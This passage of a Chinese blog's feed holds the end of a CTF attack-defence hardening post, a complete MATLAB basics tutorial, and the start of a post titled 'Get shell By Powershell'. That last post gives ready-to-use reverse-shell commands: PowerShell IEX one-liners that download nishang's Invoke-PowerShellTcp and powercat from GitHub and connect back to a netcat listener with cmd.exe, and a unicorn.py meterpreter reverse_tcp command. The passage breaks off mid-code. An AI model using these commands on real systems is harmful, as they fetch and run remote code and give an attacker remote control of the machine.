alt="img"></p><p>如果想整站防护，比如防注入waf，在网站的一个公用文件中，如数据库链接文件<code>config.inc.php</code>中, 引入调用waf代码:</p><pre><code>require_once(&#39;waf.php&#39;);</code></pre><h2 id="8-我可能get了假的flag"><a href="#8-我可能get了假的flag" class="headerlink" title="8. 我可能get了假的flag"></a>8. 我可能get了假的flag</h2><p>　　如果说很不幸，我们前面的关卡都被突破了（实际上我都感觉前面那些设置都有点<code>搅屎</code>的味道了，不过还是希望师傅们能一起来讨论讨论有没有什么骚姿势，以及绕过它们的方法）。假设真的被突破了，对于CTF线下赛来说，我们最终的目的都是拿到flag。通常我们会在服务器上执行类似于”getflag”命令，或者”curl”访问某个url获取flag，然后获取到一个字符串，然后在答题平台上提交这段字符串即可获取分数。就拿前之前的ISCC来说，这个也是我赛后想到的。这个getflag是一个elf的程序，在/usr/bin/下，顺手给下载了，有兴趣的同学可以去逆向一波。重点在这，有几次我getflag的时候因为webshell丢了，服务器显示了Error。后来想想，我们是不是可以故意利用这种报错来欺骗不细心的竞争对手呢，当然我不知道是不是已经有师傅们用了这个手法。这是模拟的效果：</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928195333387-1185344619.png" alt="img"></p><p> <img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928195410106-1460692717.png" alt="img"></p><p> 　　怎样实现？比如我们可以添加alias别名，或者我们可以把这些命令更改或者替换掉，换成一些伪装命令程序。再换一层想想，接着上面的思路，如果我们替换或者伪装了系统命令，对方getshell之后，进来发现cd，ls等命令都没法用，会怎么样呢？然而这样会不会不太好～～</p><p>　　最后推荐一个感觉挺实用功能很强的远程连接管理工具，可以极大方便我们的工作：<a href="https://mobaxterm.mobatek.net/" target="_blank" rel="noopener">MobaXterm</a>。（不是打广告~）</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928201926981-525307116.png" alt="img"></p><p>它支持多种连接方式，可以拖拽进行文件管理。支持在打开的会话一键批量执行命令</p><p> <img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928202117887-1526141416.png" alt="img"></p><p>还有一个非常方便的ssh端口转发功能，支持本地、远程、动态转发。</p><p><img src="http://images2017.cnblogs.com/blog/1012328/201709/1012328-20170928202717403-1093509689.png" alt="img"></p><p>　　还有很多其他功能貌似很厉害，不过我没用过，就不说了…</p><p>　　真不是打广告。</p><h1 id="三-对CTF举办的一点小小建议"><a href="#三-对CTF举办的一点小小建议" class="headerlink" title="三. 对CTF举办的一点小小建议"></a>三. 对CTF举办的一点小小建议</h1><p>　　如今CTF越来越火，对于这些比赛的举办方，我有着一些不成熟想法和小建议，如果您觉得有什么不合适的地方，纯当娱乐：</p><p>　　（1）扩展竞技形式：目前线下赛web攻防占绝大多数，有些小比赛甚至只有若干web服务器，上面放几个不同类型的站点，形式有些单一了，其实可以增加多种对抗模式，甚至可以让参赛选手走出比赛场地。去年曾有幸聆听了诸葛建伟博士关于打破XCTF现有格局的讲座，他提出了体系化攻防演练，认为CTF可以引入实地wifi渗透、门禁系统突破、无人机攻防、GPS信号对抗等，增加比赛多样性与趣味性，让线下赛不再只是局限于小小的机房~~</p><p>　　（2）重视安全分析与防护。安全不仅仅只是网络攻防对抗，数据分析、取证分析、应急响应、追踪溯源等技能也相当重要，并且在安全人才圈里这方面缺口也比较大。今年六月份，启明星辰主办的2017”信息安全铁人三项赛”（分为”个人逆向赛“、”数据分析赛“、”企业攻防赛“三个赛事），其中”数据分析赛“便是一个典型代表，参赛选手需要分析真实企业网络环境下受网络攻击的流量数据，从中找出攻击者、分析其网络攻击行为，如欺骗劫持、爆破、webshell连接操作等，找到并分析攻击者的后门或者恶意软件。这种模式，有助于参赛者接触到相对更加真实的网络攻击流量的对抗与防御。</p><p>　　（3）完善竞技模式的具体细节，尽量避免取巧或者粗暴姿势。比如拿修补漏洞举例子，现在CTF线下赛中绝大部分参赛者为了维持加固自己的shell，往往都会采用删除部分页面的方法，比如登陆、注册页面，因为采用正常打补丁、修改配置等操作都比较费时费事。但在比赛中这种方式是对于学习真正的安全加固、漏洞修补知识没有太多提高。玩CTF不应该仅仅为了比赛而比赛，或者只是为了拿个奖、拿几张证书，还是要注重从中学到点东西，不过有证书对以后就业还是有些帮助的。</p><p> 　　虽然说这些会增加举办方的负担，给选手增加难度，但是这也是一种趋势。CTF必然要经历从普及到提高的转变，并且随着参赛选手水平的提高，我们确实需要一些更有意思的玩法，这是一个相互促进的关系。当然，对于入门级的CTF选手来说，题目难度过大反而会降低比赛体验，对于不同级别的玩家，可以设置不同级别的赛事。从形式上奖，像引入门禁系统突破、无人机攻防等，对于大部分CTF举办方来说实现起来有些难度，毕竟涉及到不同的环境、设备、人员维护等问题，所以这个不应该强求，但是对网络攻防来说增加如windows 服务器、邮件服务器、路由设备等还是可行的。以后的CTF规格和水平会越来越高，对于参赛选手的挑战难度也会越来越大，这对于举办方和选手来说都是挑战，但是挑战亦是机遇，我们应时刻准备好投入战斗！</p><h1 id="四-最后的话"><a href="#四-最后的话" class="headerlink" title="四. 最后的话"></a>四. 最后的话</h1><p>　　虽说上面提到的这些姿势不可能让我们的靶机变得无懈可击，但是至少能在某种程度上提高它的防御值，希望能对大家有所帮助。最后，祝愿各位CTF参赛选手在比赛中勇创佳绩，同时也祝愿各单位的大佬们都能把CTF筹办的越来越好！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>MATLAB基础函数命令</title>
      <link href="/2017/09/05/matlab-ji-chu-han-shu-ming-ling/"/>
      <url>/2017/09/05/matlab-ji-chu-han-shu-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="一-常用命令"><a href="#一-常用命令" class="headerlink" title="一. 常用命令"></a>一. 常用命令</h1><p><code>dir</code>：列出当前目录下的所有文件<br><code>clc</code>：清除命令窗<br><code>clear all</code>：清除环境（从内存中清除所有变量）<br><code>who</code>：将内存中的当前变量以简单形式列出<br><code>close all</code>: 关闭所有的 Figure 窗口</p><h1 id="二-变量设置"><a href="#二-变量设置" class="headerlink" title="二.变量设置"></a>二.变量设置</h1><h2 id="1-变量命名"><a href="#1-变量命名" class="headerlink" title="1.变量命名"></a>1.变量命名</h2><ul><li><p>MATLAB 的变量名以字母开头，后最多可跟 19 个字母或数字。如 <code>x</code>,<code>y</code>,<code>ae3</code>和<code>d3er45</code>等都是合法的变量名，不能使用内部函数或命令名作为变量名。</p></li><li><p>MATLAB 中的变量名区分大小，ab 与 Ab 表示两个不同的变量。</p></li></ul><h2 id="2-变量赋值"><a href="#2-变量赋值" class="headerlink" title="2.变量赋值"></a>2.变量赋值</h2><h3 id="1-表达式赋值"><a href="#1-表达式赋值" class="headerlink" title="(1) 表达式赋值"></a>(1) 表达式赋值</h3><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> a<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">0.02</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">4.0</span>a<span class="token operator">=</span><span class="token number">0.0500</span></code></pre><h3 id="2-矩阵赋值"><a href="#2-矩阵赋值" class="headerlink" title="(2) 矩阵赋值"></a>(2) 矩阵赋值</h3><p>数值通常按行输入，行之间用分号隔开。省略最后的分号，MATLAB 会回显矩阵值</p><pre class=" language-matlab"><code class="language-matlab">C<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span>；</code></pre><p>通过引用特定的位置可以单独改变某个矩阵元素</p><p>如 <code>S=[5, 6, 4]</code>，用命令 <code>S(2)=8</code>把矩阵 S 的第二个元素值由 6 改成 8。</p><p>引用已定义的矩阵，重新定义一个新矩阵。如 S=[5,6,4]，可定义一个新矩阵。</p><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> B<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">3</span> S <span class="token number">2</span><span class="token punctuation">]</span>　　B<span class="token operator">=</span><span class="token number">3</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">4</span> <span class="token number">2</span></code></pre><h1 id="三-整数操作"><a href="#三-整数操作" class="headerlink" title="三. 整数操作"></a>三. 整数操作</h1><h2 id="fix-x-截尾取整"><a href="#fix-x-截尾取整" class="headerlink" title="fix(x) 截尾取整"></a>fix(x) 截尾取整</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> <span class="token function">fix</span><span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3.12</span> <span class="token operator">-</span><span class="token number">3.12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>　　ans <span class="token operator">=</span><span class="token number">3</span>    <span class="token operator">-</span><span class="token number">3</span></code></pre><h2 id="floor-x-不超过-x-的最大整数-高斯取整"><a href="#floor-x-不超过-x-的最大整数-高斯取整" class="headerlink" title="floor(x) 不超过 x 的最大整数(高斯取整)"></a>floor(x) 不超过 x 的最大整数(高斯取整)</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> <span class="token function">floor</span><span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3.12</span> <span class="token operator">-</span><span class="token number">3.12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>　　ans <span class="token operator">=</span><span class="token number">3</span>    <span class="token operator">-</span><span class="token number">4</span></code></pre><h2 id="ceil-x-大于-x-的最小整数"><a href="#ceil-x-大于-x-的最小整数" class="headerlink" title="ceil(x) 大于 x 的最小整数"></a>ceil(x) 大于 x 的最小整数</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token operator">></span><span class="token operator">></span> <span class="token function">ceil</span><span class="token punctuation">(</span> <span class="token punctuation">[</span><span class="token number">3.12</span> <span class="token operator">-</span><span class="token number">3.12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  　ans <span class="token operator">=</span> <span class="token number">4</span>  <span class="token operator">-</span><span class="token number">3</span></code></pre><h1 id="四-随机序列常用命令"><a href="#四-随机序列常用命令" class="headerlink" title="四. 随机序列常用命令"></a>四. 随机序列常用命令</h1><p>rand：均匀分布随机矩阵</p><blockquote><p>rand          　　%无变量输入时只产生一个随机数<br>y= rand(n)       %生成 n×n 随机矩阵，其元素在（0，1）内<br>y = rand(m,n)    %生成 m×n 随机矩阵，其元素在（0，1）内</p></blockquote><p>randn:正态分布随机矩阵</p><blockquote><p>randn           　  %无变量输入时只产生一个正态分布随机数<br>y= randn(n)       %生成 n×n 正态分布随机矩阵<br>y = randn(m,n)   %生成 m×n 正态分布随机矩阵</p></blockquote><p>randsrc:</p><blockquote><p>randsrc          　　%无变量输入时只产生一个随机数 1 或者-1<br>y= randsrc(n)        %生成 n×n 随机数组，其元素为 1 或者-1<br>y = randsrc(m,n)   %生成 m×n 随机数组，其元素为 1 或者-1</p></blockquote><h1 id="五-矩阵常用操作命令"><a href="#五-矩阵常用操作命令" class="headerlink" title="五. 矩阵常用操作命令"></a>五. 矩阵常用操作命令</h1><p>MATLAB 的基本单位是矩阵，掌握矩阵的输入、各种数值运算以及矩阵函数是学好 MATLAB 的关键。</p><h2 id="矩阵的输入"><a href="#矩阵的输入" class="headerlink" title="矩阵的输入"></a>矩阵的输入</h2><h3 id="直接输入创建矩阵"><a href="#直接输入创建矩阵" class="headerlink" title="直接输入创建矩阵"></a>直接输入创建矩阵</h3><ul><li><p>　　以<code>[</code>和<code>]</code>作为首尾，同行的元素用<code>逗号</code>或<code>空格</code>隔开，不同行的元素用<code>；</code>或按<code>Enter</code> 键来分隔；</p></li><li><p>　　矩阵的元素可以是数字也可以是表达式，如果是数值计算，表达式中不可包含未知变量。</p></li></ul><h3 id="用矩阵函数来生成矩阵"><a href="#用矩阵函数来生成矩阵" class="headerlink" title="用矩阵函数来生成矩阵"></a>用矩阵函数来生成矩阵</h3><p>　　MATLAB 提供了大量的函数来创建特殊矩阵，表 1.1 给出 MATLAB 常用的矩阵函数。见下表：Matlab常用矩阵函数 </p><table><thead><tr><th>函数名称</th><th>函数功能</th></tr></thead><tbody><tr><td>zero(m,n)</td><td>m 行 n 列零矩阵</td></tr><tr><td>eye(n)</td><td>n 阶方矩阵</td></tr><tr><td>ones(m,n)</td><td>m 行 n 列元素为 1 的矩阵</td></tr><tr><td>rand(m,n)</td><td>m 行 n 列随机矩阵</td></tr><tr><td>randn(m,n)</td><td>m 行 n 列正态随机矩阵</td></tr><tr><td>magic(n)</td><td>n 阶魔方矩阵</td></tr></tbody></table><h4 id="操作符：说明"><a href="#操作符：说明" class="headerlink" title="操作符：说明"></a>操作符<code>：</code>说明</h4><pre class=" language-bash"><code class="language-bash">j:k         表示步长为 1 的等差数列构成的数组：<span class="token punctuation">[</span>j, j+1, j+2,…, k<span class="token punctuation">]</span>。j:i:k       表示步长为 i 的等差数列构成的数组：<span class="token punctuation">[</span>j,j+i,j+2*i,…, k<span class="token punctuation">]</span>。A<span class="token punctuation">(</span>i:j<span class="token punctuation">)</span>      表示 A<span class="token punctuation">(</span>i<span class="token punctuation">)</span>，A<span class="token punctuation">(</span>i+1<span class="token punctuation">)</span>，…，A<span class="token punctuation">(</span>j<span class="token punctuation">)</span>。</code></pre><h2 id="矩阵元素操作"><a href="#矩阵元素操作" class="headerlink" title="矩阵元素操作"></a>矩阵元素操作</h2><p>设 A 是一个矩阵,则在 MATLAB 中用如下符号表示它的元素:</p><pre class=" language-bash"><code class="language-bash">A<span class="token punctuation">(</span>i,j<span class="token punctuation">)</span>　　　　表示矩阵 A 的第 i 行第 j 列元素。A<span class="token punctuation">(</span>:,j<span class="token punctuation">)</span>　　　　表示矩阵 A 的第 j 列。A<span class="token punctuation">(</span>i,:<span class="token punctuation">)</span>　　　　表示矩阵 A 的第 i 行。A<span class="token punctuation">(</span>:,:<span class="token punctuation">)</span>　　　　表示 A 的所有元素构造 2 维矩阵A<span class="token punctuation">(</span>:<span class="token punctuation">)</span>         表示以矩阵 A 的所有元素按列构成的一个列矩阵。A<span class="token punctuation">(</span>i<span class="token punctuation">)</span>         表示矩阵 A<span class="token punctuation">(</span>:<span class="token punctuation">)</span>的第 i 个元素。<span class="token punctuation">[</span> <span class="token punctuation">]</span>          表示空矩阵。</code></pre><h2 id="矩阵的运算"><a href="#矩阵的运算" class="headerlink" title="矩阵的运算"></a>矩阵的运算</h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>A+B：矩阵加法</td><td>A-B：矩阵减法</td></tr><tr><td>A*B：矩阵乘法</td><td>A’：A 的转置</td></tr><tr><td>k*A：数 k 乘以 A</td><td>det(A)：A 的行列式</td></tr><tr><td>rank(A)：A 的秩</td></tr></tbody></table><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>在MATLAB 中数组是一行或者一列的矩阵，对矩阵输入、修改和保存都适用于数组，同时 MATLAB 还提供了一些创建数组的特殊指令。</p><h4 id="特殊数组的创建"><a href="#特殊数组的创建" class="headerlink" title="特殊数组的创建"></a>特殊数组的创建</h4><p><code>linspace(a,b,n)</code>      给出区间[a,b]的 n 个等分点数据</p><h4 id="数组运算"><a href="#数组运算" class="headerlink" title="数组运算"></a>数组运算</h4><p>数组运算强调元素对元素的运算。数组运算除作为 1×n 的矩阵应遵循矩阵的运算规则外，MATLAB 中还为数组提供了一些特殊的运算：</p><p> 乘法为：<code>.*</code></p><p>乘幂为：<code>.^</code></p><h1 id="六-位操作"><a href="#六-位操作" class="headerlink" title="六.位操作"></a>六.位操作</h1><h2 id="bitand按位与"><a href="#bitand按位与" class="headerlink" title="bitand按位与"></a><code>bitand</code>按位与</h2><blockquote><p>C=bitand(A,B)命令将返回两个非负整数数组 A 和 B 的相应元素按位与操作的结果<br>为了确保 A 和 B 的元素都是整数，可以使用 ceil、fix、floor 和 round函数来生成 A 和 B</p></blockquote><h2 id="bitor：按位或"><a href="#bitor：按位或" class="headerlink" title="bitor：按位或"></a><code>bitor</code>：按位或</h2><blockquote><p>C=bitor(A,B)命令将返回两个非负整数数组 A 和 B 的相应元素按位或操作的结果。<br>为了确保 A 和 B 的元素都是整数，可以使用 ceil、fix、floor 和 round 函数来生成 A 和 B</p></blockquote><h2 id="bitxor：按位异或"><a href="#bitxor：按位异或" class="headerlink" title="bitxor：按位异或"></a><code>bitxor</code>：按位异或</h2><blockquote><p>C=bitxor(A,B)返回两个非负整数数组 A 和 B 的相应元素进行按位异或的结果<br>为了确保 A 和 B 的元素都是整数，可以使用 ceil、fix、floor 和 round 函数来生成 A 和 B</p></blockquote><h2 id="bitset：设置指定位的值"><a href="#bitset：设置指定位的值" class="headerlink" title="bitset：设置指定位的值"></a><code>bitset</code>：设置指定位的值</h2><blockquote><p>C=bitset(A,bit,v)命令将 A 中元素第 bit 位设为 v<br>其中 v 必须为 0 或 1，A 中的元素必须为非负整数<br>bit 必须为1到A中元素浮点整数表示法的位数之间的一个数字</p></blockquote><h2 id="bitget：获取指定位的值"><a href="#bitget：获取指定位的值" class="headerlink" title="bitget：获取指定位的值"></a><code>bitget</code>：获取指定位的值</h2><blockquote><p>C=bitget(A,bit)命令将返回 A 中元素用 bit 指定位的值<br>A 中的元素必须为非负整数，bit 必须为 1 到 A 中元素浮点整数表示法位数之间的一个数字</p></blockquote><h1 id="七-绘图操作"><a href="#七-绘图操作" class="headerlink" title="七. 绘图操作"></a>七. 绘图操作</h1><h2 id="图形标注"><a href="#图形标注" class="headerlink" title="图形标注"></a>图形标注</h2><pre class=" language-matlab"><code class="language-matlab"><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span><span class="token string">'属性名'</span><span class="token punctuation">,</span><span class="token string">'属性值'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span>     —— 给图形加标题<span class="token function">xlabel</span> <span class="token punctuation">(</span>‘string<span class="token operator">'</span><span class="token punctuation">,</span><span class="token string">'属性名'</span><span class="token punctuation">,</span><span class="token string">'属性值'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span> —— 给 x 轴加标注<span class="token function">ylabel</span> <span class="token punctuation">(</span>‘string<span class="token operator">'</span><span class="token punctuation">,</span><span class="token string">'属性名'</span><span class="token punctuation">,</span><span class="token string">'属性值'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span> —— 给 y 轴加标注<span class="token function">legend</span> <span class="token punctuation">(</span>‘string1<span class="token operator">'</span><span class="token punctuation">,</span><span class="token string">'string2'</span><span class="token punctuation">,</span>…<span class="token punctuation">)</span>         —— 添加图例。其顺序对应于绘图指令中的顺序 <span class="token function">axis</span> <span class="token punctuation">(</span><span class="token punctuation">[</span>xmin<span class="token punctuation">,</span>xmax<span class="token punctuation">,</span>ymin<span class="token punctuation">,</span>ymax<span class="token punctuation">]</span><span class="token punctuation">)</span>         —— 控制坐标轴的刻度范围</code></pre><h2 id="二维图形"><a href="#二维图形" class="headerlink" title="二维图形"></a>二维图形</h2><p><code>plot(x,y)</code></p><blockquote><p>功能：以向量 x,y 为轴，绘制曲线。</p></blockquote><p>　　注: plot(x,y)命令可用来绘制函数f(x)图形，此时可通过向量x常用命令<code>x=a:h:b</code>的形式获得 ，f(x)函数在绘图区间<code>[a,b]</code>上的自变量点向量数据，对应的函数向量值取为 <code>y= f(x)</code>。步长 h 可以任意选取，一般步长越小，曲线越光滑。但是步长太小，会增加计算量，运算速度也要降低。通常步长 h 取值 0.1 可达到较好的绘图效果。</p><p><code>plot(x1,y1,x2,y2,x3,y3…)</code></p><blockquote><p>功能：在同一图形窗口绘制多条不同颜色曲线</p></blockquote><p>曲线关系为：<code>y1=f(x1)，y2=f(x2)，y3=f(x3)</code></p><h3 id="二维特殊图形"><a href="#二维特殊图形" class="headerlink" title="二维特殊图形"></a>二维特殊图形</h3><p><code>bar</code></p><p><code>Hist</code> 表示生成直方图</p><p>　<code>M=hist(N)</code>表示将 N 中的最大最小值找出来，然后，平均取十个等间隔点，看以每个间隔点为中心，向两边各扩展 1/2 间隔的范围内，包括 N 的元素个数，因此 M 返回值都是 1*10 大小。</p><h1 id="八-文件操作"><a href="#八-文件操作" class="headerlink" title="八.文件操作"></a>八.文件操作</h1><h2 id="fopen-打开文件"><a href="#fopen-打开文件" class="headerlink" title="fopen 打开文件"></a>fopen 打开文件</h2><blockquote><p>fid= fopen(文件名，打开方式)</p></blockquote><p>其中文件名用字符串形式，表示待打开的数据文件。常见的打开方式有：</p><ul><li>‘r’    表示对打开的文件读数据</li><li>‘w’    表示对打开的文件写数据</li><li>‘a’    表示在打开的文件末尾添加数据</li></ul><p>fid 用于存储文件句柄值，句柄值用来标识该数据文件，其他函数可利用它对该数据文件进行操作。</p><p>文件数据格式有两种形式，一种是<code>二进制文件</code>，另一种是<code>文本文件</code>。在打开文件时需要进一步指定文件格式类型，即指定是二进制文件还是文本文件。</p><h2 id="fclose-关闭文件"><a href="#fclose-关闭文件" class="headerlink" title="fclose 关闭文件"></a>fclose 关闭文件</h2><p>文件读、写等操作完成后，应及时关闭。关闭文件用 fclose 函数，调用格式为：<code>sta=fclose(fid)</code>。该函数关闭 fid 所表示的文件。sta 表示关闭文件操作的返回代码，若关闭成功，返回 0，否则返回–1。</p><h2 id="二进制文件读写"><a href="#二进制文件读写" class="headerlink" title="二进制文件读写"></a>二进制文件读写</h2><h3 id="fread-读二进制文件"><a href="#fread-读二进制文件" class="headerlink" title="fread 读二进制文件"></a>fread 读二进制文件</h3><p>fread 函数可以读取二进制文件的数据，并将数据存入矩阵。其调用格式为：</p><blockquote><p>[A,COUNT]=fread(fid,size, precision)</p></blockquote><p>　　其中 A 用于存放读取的数据，COUNT 返回所读取的数据元素个数。fid 为文件句柄，size 为可选项，若不选用则表示读取整个文件内容，若选用则它的值可为以下选项：N 表示读取 N 个元素到一个列向量；Inf 表示读取整个文件；[M,N]表示读数据到 M×N 的矩阵中，数据按列存放。precision 代表读写数据的类型。</p><h3 id="fwrite-写二进制文件"><a href="#fwrite-写二进制文件" class="headerlink" title="fwrite 写二进制文件"></a>fwrite 写二进制文件</h3><p>fwrite 函数按照指定的数据类型将矩阵中的元素写入到文件中。其调用格式为：</p><blockquote><p>COUNT=fwrite (fid, A, precision)</p></blockquote><p>其中 COUNT 返回所写的数据元素个数，fid为文件句柄，A 用来存放写入文件的数据，precision 用于控制所写数据的类型，其形式与 fread 函数相同。</p><h1 id="九-M文件的建立与使用"><a href="#九-M文件的建立与使用" class="headerlink" title="九. M文件的建立与使用"></a>九. M文件的建立与使用</h1><p>　　M文件有命令文件和函数文件两种形式，这两种文件的扩展名相同，都是<code>.m</code>。当用户要运行的命令较多时，直接从键盘上逐条输入较为繁琐，可利用命令文件来解决多行输入问题。用户可将一组相关命令编辑在同一个命令文件中，运行时只需输入文件名字，MATLAB 就会自动按顺序执行文件中的命令。函数文件是另一种形式的 M 文件，它的第一句可执行语句是以 function 引导的定义语句，在函数文件中的变量都是局部变量。</p><h2 id="命令文件"><a href="#命令文件" class="headerlink" title="命令文件"></a>命令文件</h2><p>命令文件的一般形式为：</p><blockquote><p>&lt;M 文件名&gt;</p></blockquote><p>如<code>a1.m</code>, <code>pp.m</code> 等都是合法的 M 文件名。</p><p>M 文件有两种运行方式：</p><ul><li>一是在命令窗口直接输入文件名，按 Enter 键</li><li>二是在编辑窗口打开菜单 Tools，再单击 Run</li></ul><p>M 文件保存的路径一定要在搜索路径上,否则 M 文件不能运行。比如用 M 命令文件绘制 lena.bmp 图像。</p><p><strong>第一步</strong>：打开 MATLAB 命令窗口，单击<code>【File】|【New】|【Mfile】</code>，打开编辑窗口；</p><p><strong>第二步</strong>：在编辑窗口中输入：</p><pre class=" language-matlab"><code class="language-matlab">clc<span class="token punctuation">;</span>clear<span class="token punctuation">;</span><span class="token punctuation">[</span>fn<span class="token punctuation">,</span> pn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uigetfile</span><span class="token punctuation">(</span><span class="token string">'*.bmp'</span><span class="token punctuation">,</span> <span class="token string">'请选择图像文件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">[</span>x<span class="token punctuation">,</span> map<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">imread</span><span class="token punctuation">(</span><span class="token function">strcat</span><span class="token punctuation">(</span>pn<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'bmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">imshow</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>第三步</strong>：保存 M 文件，并且保存在搜索路径上，文件名为 <code>showlena.m</code>;</p><p><strong>第四步</strong>：运行 M 文件。在命令窗口输入 <code>showlena</code>,并按 <code>Enter</code> 键；或在编辑窗口打开菜单 <code>Tools</code>，再选择 <code>Run</code> 命令。</p><h2 id="函数文件"><a href="#函数文件" class="headerlink" title="函数文件"></a>函数文件</h2><p>M函数文件的一般形式为：</p><blockquote><p>function 因变量=函数名(自变量)</p></blockquote><p>M函数文件可以有多个因变量和多个自变量，当有多个因变量时用<code>[]</code>括起来。例：</p><p><strong>第一步</strong>：打开 MATLAB 命令窗口，单击<code>【File】|【New】|【Mfile</code>打开编辑窗口；</p><p><strong>第二步</strong>：在编辑窗口逐行写下列语句；</p><pre class=" language-matlab"><code class="language-matlab"><span class="token keyword">function</span> y<span class="token operator">=</span><span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token function">imshow</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>第三步</strong>：保存 M 函数文件，并且保存在搜索路径上，文件名为 showimage.m;</p><p><strong>第四步</strong>：命令窗口执行下列语句：</p><pre class=" language-matlab"><code class="language-matlab"><span class="token punctuation">[</span>fn<span class="token punctuation">,</span> pn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">uigetfile</span><span class="token punctuation">(</span><span class="token string">'*.bmp'</span><span class="token punctuation">,</span> <span class="token string">'请选择图像文件'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">[</span>x<span class="token punctuation">,</span> map<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">imread</span><span class="token punctuation">(</span><span class="token function">strcat</span><span class="token punctuation">(</span>pn<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'bmp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">a</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 程序代码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> MATLAB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Get shell By Powershell</title>
      <link href="/2017/08/30/get-shell-by-powershell/"/>
      <url>/2017/08/30/get-shell-by-powershell/</url>
      
        <content type="html"><![CDATA[<h1 id="Invoke-PowerShellTcp-ps1"><a href="#Invoke-PowerShellTcp-ps1" class="headerlink" title="Invoke-PowerShellTcp.ps1"></a><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank" rel="noopener">Invoke-PowerShellTcp.ps1</a></h1><p>监听：nc -nv -l -p 9999</p><p>目标执行：</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>nop <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 监听主机ip -Port 9999"</span></code></pre><p> <img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171024172723754-2054184126.png" alt=""></p><h1 id="powercat-ps1"><a href="#powercat-ps1" class="headerlink" title="powercat.ps1"></a><a href="https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1" target="_blank" rel="noopener">powercat.ps1</a></h1><p>监听：nc -nv -l -p 9999</p><p>目标执行：</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>nop <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 监听主机ip  -p 9999 -e cmd.exe"</span></code></pre><p> <img src="http://images2017.cnblogs.com/blog/1012328/201710/1012328-20171024171733379-368769789.png" alt=""></p><h1 id="unicorn-py"><a href="#unicorn-py" class="headerlink" title="unicorn.py"></a><a href="https://github.com/trustedsec/unicorn.git" target="_blank" rel="noopener">unicorn.py</a></h1><pre class=" language-python"><code class="language-python">python unicorn<span class="token punctuation">.</span>py windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.5</span> <span class="token number">443</span></code></pre><h1 id="Lnk-Powershell"><a href="#Lnk-Powershell" class="headerlink" title="Lnk Powershell"></a>Lnk Powershell</h1><p>生成快捷方式shell的Powershell脚本</p><pre class=" language-powershell"><code class="language-powershell"><span class="token 